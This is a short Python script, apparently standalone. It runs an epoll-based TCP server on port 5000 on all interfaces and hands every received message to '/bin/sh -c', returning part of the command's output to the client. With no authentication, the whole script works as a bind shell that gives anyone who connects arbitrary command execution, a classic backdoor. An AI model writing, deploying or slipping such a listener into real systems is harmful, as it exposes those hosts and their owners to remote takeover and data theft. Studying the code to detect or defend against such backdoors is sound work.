import socket
import os
import signal
import select

HOST = ""
PORT = 5000

signal.signal(signal.SIGCHLD, signal.SIG_IGN)

try:
    epoll = select.epoll()

    s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)

    s.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    s.bind((HOST, PORT))
    s.listen()

    epoll.register(s, select.POLLIN)

    while True:
        desc_list = epoll.poll()
        for fd, event in desc_list:
            if fd == s.fileno():
                conn, _ = s.accept()
                epoll.register(conn, select.POLLIN)
                continue
            if event == select.POLLIN:
                cn = socket.socket(fileno=fd)
                recv_data = cn.recv(4096)

                print(recv_data)

                read_side, write_side = os.pipe()

                if os.fork():
                    cn.send(os.read(read_side, 100))
                    epoll.unregister(cn)
                else:
                    os.dup2(write_side, 1)
                    os.execl("/bin/sh", "sh", "-c", recv_data)

except OSError as e:
    print("Socket error({0}): {1}".format(e.errno, e.strerror))

except KeyboardInterrupt:
    print("Closing server")
    conn.close()
    s.close()
